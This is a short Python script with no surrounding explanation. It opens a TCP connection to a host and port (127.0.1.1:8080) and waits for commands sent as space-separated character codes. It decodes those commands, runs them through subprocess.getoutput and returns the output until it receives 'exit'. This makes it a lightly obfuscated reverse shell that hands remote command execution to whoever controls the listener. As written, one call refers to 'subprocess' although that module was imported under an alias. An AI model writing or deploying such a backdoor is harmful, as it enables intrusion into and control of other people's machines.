import sys as m1
import subprocess as m2
import socket as m3
H = '127.0.1.1'
P = 8080
s = m3.socket(m3.AF_INET, m3.SOCK_STREAM)
s.connect((H, P))
while True:
    d = s.recv(1024).decode()
    if d.strip() == "exit":break
    c = "".join([chr(int(x)) for x in d.split()])
    o = subprocess.getoutput(c)
    s.send(o.encode())
s.close()
